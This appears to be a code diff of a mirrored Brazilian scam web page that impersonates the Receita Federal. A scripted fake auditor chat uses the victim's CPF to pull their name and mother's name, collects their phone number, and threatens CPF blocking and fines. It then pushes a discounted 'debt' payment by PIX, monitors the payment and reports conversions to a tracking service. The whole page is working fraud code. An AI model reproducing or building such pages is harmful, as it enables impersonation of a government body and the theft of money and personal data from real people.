+
+                setTimeout(() => {
+                    button.innerHTML = originalText;
+                    button.style.background = '#044785';
+                }, 3000);
+            } catch (err) {
+                console.error('Erro ao copiar:', err);
+                alert('Erro ao copiar código. Tente selecionar manualmente.');
+            }
+        }
+
+        function closePixModal() {
+            const modal = document.getElementById('pixModal');
+            if (modal) {
+                modal.remove();
+            }
+
+            // Stop payment monitoring
+            if (window.paymentMonitorInterval) {
+                clearInterval(window.paymentMonitorInterval);
+                window.paymentMonitorInterval = null;
+            }
+        }
+
+        // Payment monitoring function usando API PHP
+        function startPaymentMonitoring(transactionId) {
+            // Clear any existing interval
+            if (window.paymentMonitorInterval) {
+                clearInterval(window.paymentMonitorInterval);
+            }
+
+            // Check payment status every 3 seconds
+            let checkCount = 0;
+            const maxChecks = 400; // Máximo de 20 minutos (400 * 3 segundos)
+
+            window.paymentMonitorInterval = setInterval(async () => {
+                checkCount++;
+
+                // Limita número de verificações para evitar loop infinito
+                if (checkCount > maxChecks) {
+                    console.warn('⏰ Limite de verificações atingido. Parando monitoramento.');
+                    clearInterval(window.paymentMonitorInterval);
+                    window.paymentMonitorInterval = null;
+                    return;
+                }
+
+                try {
+                    console.log(`🔍 Verificando status do pagamento (tentativa ${checkCount}/${maxChecks})...`);
+                    const response = await fetch(`${API_ENDPOINT}?action=check-status&payment_code=${encodeURIComponent(transactionId)}`);
+
+                    if (!response.ok) {
+                        console.error(`❌ Erro HTTP ${response.status}: ${response.statusText}`);
+                        return;
+                    }
+
+                    const statusData = await response.json();
+                    console.log('📊 Status recebido:', statusData);
+
+                    if (!statusData.success) {
+                        console.error('❌ Erro ao verificar status:', statusData.error);
+                        return;
+                    }
+
+                    // Goldiix retorna payment_status: approved, pending, refunded, error
+                    // Verifica em múltiplos lugares da resposta
+                    const status = statusData.payment_status ||
+                        statusData.status ||
+                        statusData.data?.payment_status ||
+                        (statusData.data && statusData.data.payment_status) ||
+                        'unknown';
+                    console.log(`🎯 Status atual: "${status}" (tentativa ${checkCount})`);
+                    console.log('📋 Dados completos da resposta:', JSON.stringify(statusData, null, 2));
+
+                    // Check if payment is approved
+                    if (status === 'approved' || status === 'paid') {
+                        // Clear monitoring
+                        clearInterval(window.paymentMonitorInterval);
+                        window.paymentMonitorInterval = null;
+
+                        console.log('🎉 Pagamento APROVADO! Redirecionando para página de sucesso...');
+
+                        // Envia para Utmify como pagamento aprovado via API
+                        const utmParams = await getUtmParams();
+                        const normalizedCpf = (customerData.cpf || '').replace(/\D/g, '');
+                        const normalizedPhone = (customerData.telefone || customerData.phone || '').replace(/\D/g, '');
+
+                        const now = new Date();
+                        const createdAt = now.toISOString().replace('T', ' ').substring(0, 19);
+
+                        try {
+                            await fetch(`${API_ENDPOINT}?action=send-utmify`, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                    orderId: transactionId,
+                                    platform: 'PortalUrgente',
+                                    paymentMethod: 'pix',
+                                    status: 'paid',
+                                    createdAt: createdAt,
+                                    approvedDate: createdAt,
+                                    refundedAt: null,
+                                    customer: {
+                                        name: fullName || 'Cliente',
+                                        email: customerData.email || 'cliente@example.com',
+                                        phone: normalizedPhone || null,
+                                        document: normalizedCpf || null,
+                                        country: 'BR',
+                                        ip: null
+                                    },
+                                    products: [{
+                                        id: 'regularizacao-cpf',
+                                        name: 'Regularização CPF',
+                                        planId: null,
+                                        planName: null,
+                                        quantity: 1,
+                                        priceInCents: Math.round(CONFIG.defaultAmount * 100)
+                                    }],
+                                    trackingParameters: utmParams,
+                                    commission: {
+                                        totalPriceInCents: Math.round(CONFIG.defaultAmount * 100),
+                                        gatewayFeeInCents: 0,
+                                        userCommissionInCents: 0,
+                                        currency: 'BRL'
+                                    }
+                                })
+                            });
+                        } catch (e) {
+                            console.warn('⚠️ Erro ao enviar para Utmify:', e);
+                        }
+
+                        closePixModal();
+
+                        // Obtém CPF de múltiplas fontes para garantir
+                        let cpfForRedirect = normalizedCpf;
+                        if (!cpfForRedirect) {
+                            // Tenta do localStorage
+                            try {
+                                const stored = localStorage.getItem('customerData');
+                                if (stored) {
+                                    const parsed = JSON.parse(stored);
+                                    cpfForRedirect = (parsed.cpf || '').replace(/\D/g, '');
+                                }
+                            } catch (e) {
+                                console.warn('Erro ao ler CPF do localStorage:', e);
+                            }
+                        }
+
+                        // Se ainda não tiver CPF, tenta extrair do external_code da resposta
+                        if (!cpfForRedirect && statusData.data && statusData.data.external_code) {
+                            const externalCode = statusData.data.external_code;
+                            const cpfMatch = externalCode.match(/PIX_(\d{11})_/);
+                            if (cpfMatch) {
+                                cpfForRedirect = cpfMatch[1];
+                                console.log('✅ CPF extraído do external_code:', cpfForRedirect);
+                            }
+                        }
+
+                        // Gera URL de sucesso - redireciona para index.html com CPF
+                        const successUrl = cpfForRedirect
+                            ? `../index.html?cpf=${encodeURIComponent(cpfForRedirect)}`
+                            : '../index.html';
+
+                        console.log('🔗 Redirecionando para:', successUrl);
+                        console.log('📋 CPF usado:', cpfForRedirect);
+
+                        // Mostra mensagem de sucesso antes de redirecionar
+                        alert('✅ Pagamento confirmado com sucesso! Redirecionando...');
+
+                        // Redireciona para index.html com CPF
+                        window.location.href = successUrl;
+                        return;
+                    } else if (status === 'pending') {
+                        console.log('⏳ Pagamento ainda pendente...');
+                    } else if (status === 'error') {
+                        console.log('❌ Pagamento com erro');
+                        clearInterval(window.paymentMonitorInterval);
+                        window.paymentMonitorInterval = null;
+                    } else if (status === 'refunded') {
+                        console.log('⚠️ Pagamento estornado');
+                        clearInterval(window.paymentMonitorInterval);
+                        window.paymentMonitorInterval = null;
+                    }
+                } catch (error) {
+                    console.error('❌ Erro ao verificar status do pagamento:', error);
+                }
+            }, 3000); // Check every 3 seconds
+
+            console.log(`⏰ Monitoramento configurado com timeout de 20 minutos`);
+
+            // Timeout after 20 minutes (PIX expiration)
+            setTimeout(() => {
+                if (window.paymentMonitorInterval) {
+                    clearInterval(window.paymentMonitorInterval);
+                    window.paymentMonitorInterval = null;
+                    console.log('⏰ Monitoramento encerrado por timeout (20 minutos)');
+                }
+            }, 20 * 60 * 1000); // 20 minutes
+        }
+
+        // Initialize chat
+        async function initializeChat() {
+            await new Promise(resolve => setTimeout(resolve, 1000));
+
+            for (let i = 0; i < chatSequence.length; i++) {
+                const message = chatSequence[i];
+
+                // Show typing
+                await showTyping(message.delay);
+
+                // Add message
+                addMessage(message.message, true, true);
+
+                // Request phone after second message
+                if (message.requestPhone) {
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    await showTyping(3000);
+                    addMessage(`Para continuar com a regularização do débito, preciso confirmar seu número de telefone.`, true, true);
+
+                    // Show phone input form
+                    setTimeout(() => {
+                        showPhoneInput();
+                    }, 1000);
+
+                    // Wait for phone confirmation before continuing
+                    await waitForPhoneConfirmation();
+                }
+
+                // Show options if specified
+                if (message.showOptions) {
+                    setTimeout(() => {
+                        showOptions(message.showOptions);
+                    }, 1500);
+                }
+            }
+        }
+
+        // Global variable to control phone confirmation
+        let phoneConfirmationResolve = null;
+
+        // Função para formatar telefone brasileiro (11) 98765-4321
+        function formatBrazilianPhone(value) {
+            // Remove tudo que não é número
+            const numbers = value.replace(/\D/g, '');
+
+            // Se começar com 55, é telefone internacional
+            if (numbers.length >= 2 && numbers.substring(0, 2) === '55') {
+                return formatInternationalPhone(numbers);
+            }
+
+            // Telefone brasileiro: (11) 98765-4321
+            if (numbers.length <= 2) {
+                return numbers.length > 0 ? `(${numbers}` : numbers;
+            } else if (numbers.length <= 7) {
+                return `(${numbers.substring(0, 2)}) ${numbers.substring(2)}`;
+            } else if (numbers.length <= 10) {
+                return `(${numbers.substring(0, 2)}) ${numbers.substring(2, 6)}-${numbers.substring(6)}`;
+            } else {
+                return `(${numbers.substring(0, 2)}) ${numbers.substring(2, 7)}-${numbers.substring(7, 11)}`;
+            }
+        }
+
+        // Função para formatar telefone internacional +55 11 98765-4321
+        function formatInternationalPhone(value) {
+            const numbers = value.replace(/\D/g, '');
+
+            if (numbers.length <= 2) {
+                return numbers.length > 0 ? `+${numbers}` : numbers;
+            } else if (numbers.length <= 4) {
+                return `+${numbers.substring(0, 2)} ${numbers.substring(2)}`;
+            } else if (numbers.length <= 9) {
+                return `+${numbers.substring(0, 2)} ${numbers.substring(2, 4)} ${numbers.substring(4)}`;
+            } else if (numbers.length <= 10) {
+                return `+${numbers.substring(0, 2)} ${numbers.substring(2, 4)} ${numbers.substring(4, 8)}-${numbers.substring(8)}`;
+            } else {
+                return `+${numbers.substring(0, 2)} ${numbers.substring(2, 4)} ${numbers.substring(4, 9)}-${numbers.substring(9, 13)}`;
+            }
+        }
+
+        // Função para formatar telefone enquanto digita
+        function formatPhoneInput(input) {
+            const value = input.value;
+            const cursorPosition = input.selectionStart;
+            const numbers = value.replace(/\D/g, '');
+
+            // Determina se é telefone internacional (começa com 55)
+            const isInternational = numbers.length >= 2 && numbers.substring(0, 2) === '55';
+
+            let formatted;
+            if (isInternational) {
+                formatted = formatInternationalPhone(numbers);
+                input.maxLength = 15; // +55 11 98765-4321
+            } else {
+                formatted = formatBrazilianPhone(numbers);
+                input.maxLength = 15; // (11) 98765-4321
+            }
+
+            input.value = formatted;
+
+            // Ajusta a posição do cursor
+            const newCursorPosition = cursorPosition + (formatted.length - value.length);
+            input.setSelectionRange(newCursorPosition, newCursorPosition);
+        }
+
+        // Show phone input form
+        function showPhoneInput() {
+            const phoneInputHtml = `
+        <div class="phone-input-container" style="margin-top: 20px; margin-bottom: 20px; padding-left: 0px; margin-left: -10px; max-width: 75%;">
+            <div style="background: #f8f9fa; border-radius: 8px; padding: 20px; border: 1px solid #dee2e6;">
+                <label for="phoneInput" style="display: block; margin-bottom: 10px; font-weight: 600; color: #044785;">
+                    Digite seu número de telefone (DDD + número):
+                </label>
+                <input 
+                    type="tel" 
+                    id="phoneInput" 
+                    placeholder="Ex: (11) 98765-4321 ou +55 11 98765-4321"
+                    maxlength="15"
+                    style="
+                        width: 100%;
+                        padding: 12px;
+                        border: 2px solid #044785;
+                        border-radius: 4px;
+                        font-size: 1rem;
+                        margin-bottom: 15px;
+                        text-align: center;
+                        font-weight: 600;
+                    "
+                    oninput="formatPhoneInput(this)"
+                />
+                <button 
+                    onclick="confirmPhone()" 
+                    style="
+                        background: #044785;
+                        color: white;
+                        border: none;
+                        padding: 12px 24px;
+                        border-radius: 4px;
+                        font-weight: 600;
+                        cursor: pointer;
+                        width: 100%;
+                        font-size: 1rem;
+                    "
+                >
+                    Confirmar Telefone
+                </button>
+            </div>
+        </div>
+    `;
+
+            chatContainer.insertAdjacentHTML('beforeend', phoneInputHtml);
+            chatContainer.scrollTop = chatContainer.scrollHeight;
+
+            // Focus on input
+            setTimeout(() => {
+                const input = document.getElementById('phoneInput');
+                if (input) {
+                    input.focus();
+                }
+            }, 500);
+        }
+
+        // Wait for phone confirmation
+        function waitForPhoneConfirmation() {
+            return new Promise(resolve => {
+                phoneConfirmationResolve = resolve;
+            });
+        }
+
+        // Função para formatar telefone para exibição
+        function formatPhoneForDisplay(phone) {
+            if (!phone) return '';
+
+            const numbers = phone.replace(/\D/g, '');
+
+            // Se começar com 55, formata como internacional
+            if (numbers.length >= 2 && numbers.substring(0, 2) === '55') {
+                if (numbers.length >= 4) {
+                    const countryCode = numbers.substring(0, 2);
+                    const areaCode = numbers.substring(2, 4);
+                    const rest = numbers.substring(4);
+
+                    if (rest.length <= 4) {
+                        return `+${countryCode} ${areaCode} ${rest}`;
+                    } else if (rest.length <= 8) {
+                        return `+${countryCode} ${areaCode} ${rest.substring(0, 4)}-${rest.substring(4)}`;
+                    } else {
+                        return `+${countryCode} ${areaCode} ${rest.substring(0, 5)}-${rest.substring(5, 9)}`;
+                    }
+                }
+                return `+${numbers}`;
+            }
+
+            // Telefone brasileiro: (11) 98765-4321
+            if (numbers.length === 10) {
+                return `(${numbers.substring(0, 2)}) ${numbers.substring(2, 6)}-${numbers.substring(6)}`;
+            } else if (numbers.length === 11) {
+                return `(${numbers.substring(0, 2)}) ${numbers.substring(2, 7)}-${numbers.substring(7)}`;
+            }
+
+            return phone;
+        }
+
+        // Confirm phone number
+        async function confirmPhone() {
+            const phoneInput = document.getElementById('phoneInput');
+            if (!phoneInput) {
+                console.error('Campo de telefone não encontrado');
+                return;
+            }
+
+            // Remove formatação e pega apenas números
+            const phoneNumber = phoneInput.value.replace(/\D/g, '');
+
+            // Validação: telefone brasileiro (10 ou 11 dígitos) ou internacional (começando com 55 e pelo menos 12 dígitos)
+            const isInternational = phoneNumber.length >= 2 && phoneNumber.substring(0, 2) === '55';
+            const isValidBrazilian = phoneNumber.length === 10 || phoneNumber.length === 11;
+            const isValidInternational = isInternational && phoneNumber.length >= 12;
+
+            if (!isValidBrazilian && !isValidInternational) {
+                if (phoneNumber.length < 10) {
+                    alert('Por favor, digite um número de telefone válido com DDD (mínimo 10 dígitos).');
+                } else if (isInternational && phoneNumber.length < 12) {
+                    alert('Telefone internacional deve ter pelo menos 12 dígitos (código do país + DDD + número).');
+                } else {
+                    alert('Por favor, digite um número de telefone válido.');
+                }
+                phoneInput.focus();
+                return;
+            }
+
+            // Save phone to localStorage (apenas números, sem formatação)
+            const currentData = JSON.parse(localStorage.getItem('customerData') || '{}');
+            currentData.telefone = phoneNumber;
+            currentData.phone = phoneNumber; // Também salva como 'phone' para compatibilidade
+            localStorage.setItem('customerData', JSON.stringify(currentData));
+
+            // Formata telefone para exibição
+            const formattedPhone = formatPhoneForDisplay(phoneNumber);
+
+            // Add user response to chat (com formatação)
+            addMessage(`Telefone: ${formattedPhone}`, false, true);
+
+            // Remove phone input form
+            const phoneContainer = document.querySelector('.phone-input-container');
+            if (phoneContainer) {
+                phoneContainer.remove();
+            }
+
+            // Show typing and thank message
+            await showTyping(3000);
+            addMessage(`Obrigada, ${firstName}! Telefone confirmado. Agora vou prosseguir com as informações sobre seu débito.`, true, true);
+
+            // Resolve the promise to continue chat
+            if (phoneConfirmationResolve) {
+                phoneConfirmationResolve();
+                phoneConfirmationResolve = null;
+            }
+        }
+
+        // Start chat when page loads
+        document.addEventListener('DOMContentLoaded', initializeChat);
+
+        // Test function for payment monitoring (for debugging)
+        function testPaymentMonitoring() {
+            console.log('🧪 Testando monitoramento de pagamento com nova API...');
+            startPaymentMonitoring('7228484a-95fe-42d3-b537-b97834b1f5aa');
+        }
+
+        // Test function for manual confirmation popup
+        function testPopup() {
+            console.log('🧪 Testando popup de confirmação...');
+            showManualPaymentConfirmation('test-transaction-id');
+        }
+
+        // Function to show manual payment confirmation popup
+        function showManualPaymentConfirmation(transactionId) {
+            // Check if PIX modal is still visible
+            const pixModal = document.getElementById('pixModal');
+            if (!pixModal) {
+                console.log('Modal PIX não está mais visível, cancelando popup de confirmação');
+                return;
+            }
+
+            console.log('⏰ Mostrando popup de confirmação manual após 20 segundos');
+
+            const confirmationPopup = `
+        <div id="paymentConfirmationPopup" style="
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            z-index: 3000;
+            padding: 30px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            animation: popupFadeIn 0.3s ease-out;
+        ">
+            <h3 style="color: #044785; font-weight: 600; margin-bottom: 20px; font-size: 1.2rem;">
+                Confirmação de Pagamento
+            </h3>
+            <p style="color: #666; margin-bottom: 25px; line-height: 1.5;">
+                Você já realizou o pagamento via PIX?
+            </p>
+            <div style="display: flex; gap: 15px; justify-content: center;">
+                <button onclick="handlePaymentConfirmation('${transactionId}', true)" style="
+                    background: #28a745;
+                    color: white;
+                    border: none;
+                    padding: 12px 24px;
+                    border-radius: 6px;
+                    font-weight: 600;
+                    cursor: pointer;
+                    font-size: 1rem;
+                ">
+                    Sim
+                </button>
+                <button onclick="handlePaymentConfirmation('${transactionId}', false)" style="
+                    background: #dc3545;
+                    color: white;
+                    border: none;
+                    padding: 12px 24px;
+                    border-radius: 6px;
+                    font-weight: 600;
+                    cursor: pointer;
+                    font-size: 1rem;
+                ">
+                    Não
+                </button>
+            </div>
+        </div>
+        <div id="paymentConfirmationOverlay" style="
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 2999;
+        "></div>
+        <style>
+        @keyframes popupFadeIn {
+            0% { opacity: 0; transform: translate(-50%, -50%) scale(0.9); }
+            100% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+        }
+        </style>
+    `;
+
+            document.body.insertAdjacentHTML('beforeend', confirmationPopup);
+        }
+
+        // Function to handle manual payment confirmation
+        async function handlePaymentConfirmation(transactionId, confirmed) {
+            // Remove confirmation popup
+            const popup = document.getElementById('paymentConfirmationPopup');
+            const overlay = document.getElementById('paymentConfirmationOverlay');
+            if (popup) popup.remove();
+            if (overlay) overlay.remove();
+
+            if (confirmed) {
+                console.log('✅ Usuário confirmou pagamento, verificando status...');
+
+                try {
+                    const response = await fetch(`${API_ENDPOINT}?action=check-status&payment_code=${encodeURIComponent(transactionId)}`);
+
+                    if (!response.ok) {
+                        console.error(`❌ Erro HTTP ${response.status}: ${response.statusText}`);
+                        alert('Erro ao verificar pagamento. Tente novamente.');
+                        return;
+                    }
+
+                    const statusData = await response.json();
+                    console.log('📊 Status da verificação manual:', statusData);
+
+                    if (!statusData.success) {
+                        alert('Erro ao verificar pagamento: ' + (statusData.error || 'Tente novamente.'));
+                        return;
+                    }
+
+                    // Goldiix retorna payment_status
+                    const status = statusData.payment_status || statusData.status || 'unknown';
+                    console.log(`🎯 Status manual: "${status}"`);
+
+                    if (status === 'approved') {
+                        // Clear automatic monitoring
+                        if (window.paymentMonitorInterval) {
+                            clearInterval(window.paymentMonitorInterval);
+                            window.paymentMonitorInterval = null;
+                        }
+
+                        // Envia para Utmify como pagamento aprovado via API
+                        const utmParams = await getUtmParams();
+                        const normalizedCpf = (customerData.cpf || '').replace(/\D/g, '');
+                        const normalizedPhone = (customerData.telefone || customerData.phone || '').replace(/\D/g, '');
+
+                        const now = new Date();
+                        const createdAt = now.toISOString().replace('T', ' ').substring(0, 19);
+
+                        await fetch(`${API_ENDPOINT}?action=send-utmify`, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                orderId: transactionId,
+                                platform: 'PortalUrgente',
+                                paymentMethod: 'pix',
+                                status: 'paid',
+                                createdAt: createdAt,
+                                approvedDate: createdAt,
+                                refundedAt: null,
+                                customer: {
+                                    name: fullName || 'Cliente',
+                                    email: customerData.email || 'cliente@example.com',
+                                    phone: normalizedPhone || null,
+                                    document: normalizedCpf || null,
+                                    country: 'BR',
+                                    ip: null
+                                },
+                                products: [{
+                                    id: 'regularizacao-cpf',
+                                    name: 'Regularização CPF',
+                                    planId: null,
+                                    planName: null,
+                                    quantity: 1,
+                                    priceInCents: Math.round(CONFIG.defaultAmount * 100)
+                                }],
+                                trackingParameters: utmParams,
+                                commission: {
+                                    totalPriceInCents: Math.round(CONFIG.defaultAmount * 100),
+                                    gatewayFeeInCents: 0,
+                                    userCommissionInCents: 0,
+                                    currency: 'BRL'
+                                }
+                            })
+                        });
+
+                        // Close modal
+                        closePixModal();
+
+                        // Recupera CPF do usuário do localStorage para redirecionar com parâmetro
+                        let cpfParam = '';
+                        try {
+                            const stored = localStorage.getItem('customerData');
+                            if (stored) {
+                                const parsed = JSON.parse(stored);
+                                if (parsed && parsed.cpf) {
+                                    cpfParam = String(parsed.cpf).replace(/\D/g, '');
+                                }
+                            }
+                        } catch (e) {
+                            console.warn('Não foi possível ler customerData do localStorage para o CPF (confirmação manual):', e);
+                        }
+
+                        if (cpfParam) {
+                            window.location.href = `../spc/consulta.html?cpf=${encodeURIComponent(cpfParam)}`;
+                        } else {
+                            window.location.href = '../spc/consulta.html';
+                        }
+                    } else {
+                        console.log('⚠️ Pagamento ainda não foi aprovado');
+                        alert('Pagamento ainda não foi identificado. Aguarde alguns instantes e tente novamente.');
+                    }
+                } catch (error) {
+                    console.error('❌ Erro ao verificar status manual:', error);
+                    alert('Erro ao verificar pagamento. Tente novamente.');
+                }
+            } else {
+                console.log('❌ Usuário informou que não realizou o pagamento');
+                // Continue with automatic monitoring
+            }
+        }
+    </script>
+    <script>
+        const cpfFromUrl = new URLSearchParams(window.location.search).get("cpf");
+        if (cpfFromUrl) {
+            // Exibir CPF, carregar mensagens, etc.
+            console.log("Iniciando chat para CPF:", cpfFromUrl);
+        }
+    </script>
+    <script>
+        // Função para capitalizar nomes
+        function capitalizeNames(name) {
+            if (!name) return 'Nome não informado';
+            return name.toLowerCase().split(' ').map(word =>
+                word.charAt(0).toUpperCase() + word.slice(1)
+            ).join(' ');
+        }
+
+        // Verifica CPF na URL
+        const cpfParam = new URLSearchParams(window.location.search).get("cpf");
+
+        if (cpfParam) {
+            // Usa endpoint PHP seguro (token fica no servidor, nunca exposto)
+            const cpfNormalized = cpfParam.replace(/\D/g, ''); // Remove formatação do CPF
+
+            fetch(`consulta-cpf.php?cpf=${cpfNormalized}`)
+                .then(res => res.json())
+                .then(data => {
+                    // Verifica se houve erro
+                    if (data.error) {
+                        console.error("❌ Erro na API:", data.message);
+                        // Em caso de erro, usa CPF da URL como fallback
+                        const fallbackData = {
+                            cpf: cpfNormalized,
+                            nome: '',
+                            sexo: '',
+                            nascimento: '',
+                            nome_mae: ''
+                        };
+                        localStorage.setItem('customerData', JSON.stringify(fallbackData));
+                        iniciarChat(fallbackData);
+                        return;
+                    }
+
+                    // A API retorna: {"cpf":"","nome":"","sexo":"","nascimento":"","nome_mae":""}
+                    // Garante que o CPF está presente nos dados
+                    if (!data.cpf && cpfNormalized) {
+                        data.cpf = cpfNormalized;
+                    }
+
+                    // Salva dados no localStorage
+                    localStorage.setItem('customerData', JSON.stringify(data));
+                    console.log('✅ Dados do CPF carregados:', data);
+                    iniciarChat(data);
+                })
+                .catch(err => {
+                    console.error("❌ Erro ao buscar dados do CPF:", err);
+                    // Em caso de erro, usa CPF da URL como fallback
+                    const fallbackData = {
+                        cpf: cpfNormalized,
+                        nome: '',
+                        sexo: '',
+                        nascimento: '',
+                        nome_mae: ''
+                    };
+                    localStorage.setItem('customerData', JSON.stringify(fallbackData));
+                    iniciarChat(fallbackData);
+                });
+        } else {
+            // Se não veio pela URL, tenta pegar do localStorage
+            const local = localStorage.getItem('customerData');
+            const data = local ? JSON.parse(local) : {};
+            iniciarChat(data);
+        }
+
+        function iniciarChat(customerData) {
+            const firstName = customerData.nome ? capitalizeNames(customerData.nome.split(' ')[0]) : 'Contribuinte';
+            const fullName = customerData.nome ? capitalizeNames(customerData.nome) : 'Nome não informado';
+            const cpf = customerData.cpf || 'CPF não informado';
+
+            const chatSequence = [
+                {
+                    message: `Olá ${firstName}, aqui é a Tereza Alencar, Auditora da Receita Federal do Brasil.`,
+                    delay: 8000
+                },
+                {
+                    message: `Trabalho na área de fiscalização de débitos tributários. Foi identificado um débito pendente de R$ 419,55 no seu CPF ${cpf}, registrado em nome de ${fullName}.`,
+                    delay: 15000,
+                    requestPhone: true
+                },
+                {
+                    message: `Prezado ${firstName}, informo que seu CPF já consta na lista para bloqueio automático. Caso não efetue o pagamento, todas as atividades financeiras serão restringidas, incluindo operações bancárias, cartões de crédito e atividades comerciais.`,
+                    delay: 14000
+                },
+                {
+                    message: `Além disso, se o pagamento não for realizado hoje será aplicada uma multa adicional no valor de R$ 1.985,00 ao seu CPF, conforme determina a legislação tributária federal.`,
+                    delay: 13000
+                },
+                {
+                    message: `Importante: realizando o pagamento hoje (${new Date().toLocaleDateString("pt-BR")}) há um desconto de 67%, reduzindo o débito de R$ 419,55 para apenas R$ 138,45 ${firstName}, deseja quitar com desconto ou autoriza o bloqueio do CPF?`,
+                    delay: 12000,
+                    showOptions: 'debtOptions'
+                }
+            ];
+
+            // Executa sequência do chat
+            if (typeof runChatSequence === 'function') {
+                runChatSequence(chatSequence, firstName);
+            } else {
+                console.warn("Função runChatSequence não encontrada.");
+            }
+        }
+    </script>
+    <script>
+        // Quando a página termina de carregar
+        window.addEventListener('DOMContentLoaded', () => {
+            // Se ainda não recarregou
+            if (!sessionStorage.getItem('paginaRecarregada')) {
+                sessionStorage.setItem('paginaRecarregada', 'true');
+                location.reload();
+            }
+        });
+    </script>
+
+    <script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" data-cf-beacon="{" rayid":"9ab67c0405a2098b","version":"2025.9.1","r":1,"servertiming":{"name":{"cfextpri":true,"cfedge":true,"cforigin":true,"cfl4":true,"cfspeedbrain":true,"cfcachestatus":true}},"token":"a4513652641b4cb5bd790025784c0ee0","b":1}"="" crossorigin="anonymous"></script>
+    <script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" data-cf-beacon="{" version":"2024.11.0","token":"41c97bbb4a3a4ba89c9c7b17b2db4c77","r":1,"server_timing":{"name":{"cfcachestatus":true,"cfedge":true,"cfextpri":true,"cfl4":true,"cforigin":true,"cfspeedbrain":true},"location_startswith":null}}"="" crossorigin="anonymous"></script>
+
+
+
+
+
+
+</body><!-- Mirrored from receita.canalgovbr.org/chat by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 03 Aug 2025 02:45:21 GMT --><!-- Mirrored from consulta.portalurgente.is/a/chat.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 09 Dec 2025 18:14:52 GMT -->
+<!-- Mirrored from portalgov-com-br.netlify.app/chat/?cpf= by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 18 Feb 2026 18:19:37 GMT -->
+</html>
